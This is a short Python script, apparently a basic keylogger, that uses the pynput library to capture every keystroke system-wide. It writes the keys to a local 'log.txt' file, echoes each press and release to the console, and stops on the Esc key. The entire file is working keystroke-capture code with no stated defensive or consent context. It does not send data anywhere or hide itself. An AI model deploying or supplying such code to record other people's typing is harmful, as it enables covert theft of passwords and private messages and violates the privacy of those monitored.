import pynput
from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'a') as f:  # 'a' for append mode
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k)
            f.write(' ')  # Add space between keys for readability
        keys.clear()  # Clear keys after writing to prevent duplicates

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:  # Stops the listener when 'Esc' is pressed
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
